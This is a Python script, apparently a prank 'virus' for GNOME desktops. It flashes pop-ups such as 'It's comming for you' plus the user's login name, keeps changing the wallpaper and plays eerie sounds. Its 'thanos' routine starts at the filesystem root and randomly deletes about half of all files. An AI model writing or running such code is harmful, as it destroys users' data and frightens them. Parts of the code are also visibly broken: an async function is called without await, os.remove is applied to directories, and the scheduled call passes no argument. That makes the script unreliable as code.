import tkinter as tk
import random
import os
import schedule
import asyncio
from playsound import playsound

username = os.getlogin()

creepyText = [
    "Watching you",
    "No way out",
    "Don't open the door",
    "You are not alone",
    "It's comming",
    "You are playing my game now",
    "Getting closer",
    "Don't move",
    "Hurry",
    "It's comming for you " + username
]

creepyPic = [
    "wallpaper1.jpeg",
    "wallpaper2.jpg",
    "wallpaper3.jpg"
]

def randomNumber(min, max):
    randomNB = random.randint(min, max)
    return randomNB

def popUps():
    root = tk.Tk()
    root.configure(background="black")

    #To disable the menu
    root.overrideredirect(True)

    nb = randomNumber(0, 9)
    width, height = root.winfo_screenwidth(), root.winfo_screenheight()
    x = randomNumber(0, width-500)
    y = randomNumber(0, height-50)
    root.geometry('500x50+%d+%d' % (x, y))

    frame = tk.Frame(root, width=500, height=50, bg='black')
    frame.grid(row=0, column=0, sticky="NW")

    font = ("Ani", 20, "bold")

    label = tk.Label(root, text=creepyText[nb], bg='black', fg='white', font= font)
    label.place(relx=0.5, rely=0.5, anchor="center")

    #label.pack()
    root.after(1000, root.destroy)
    root.mainloop()

def wallpaper():
    wallnb = randomNumber(0, 2)
    os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/"+ username +"/virus/" + creepyPic[wallnb])

def bgSound():
    playsound('bgSound.mp3',0)

def sound():
    soundnb = randomNumber(0, 3)
    playsound('sound'+ str(soundnb) + '.mp3', 0)

async def thanos(dossier):
    for nom_fichier in os.scandir(dossier):
        if nom_fichier.name != 'virus':
            if nom_fichier.is_dir():
                print('call')
                thanos(nom_fichier.path)
                os.remove(nom_fichier.path)
            else:
                delete = randomNumber(0,1)
                if delete == 0:
                    print('delete ' + nom_fichier.path)
                    os.chmod(nom_fichier.path, 0o644)
                    os.remove(nom_fichier.path)
                else:
                    print('keep')

schedule.every(0.05).seconds.do(popUps)
schedule.every(50).to(75).seconds.do(sound)
schedule.every(1).seconds.do(wallpaper)
schedule.every(1.28).minutes.do(bgSound)
schedule.every(10).seconds.do(thanos)

bgSound()
asyncio.run(thanos('/'))
while True:
    schedule.run_pending()
    

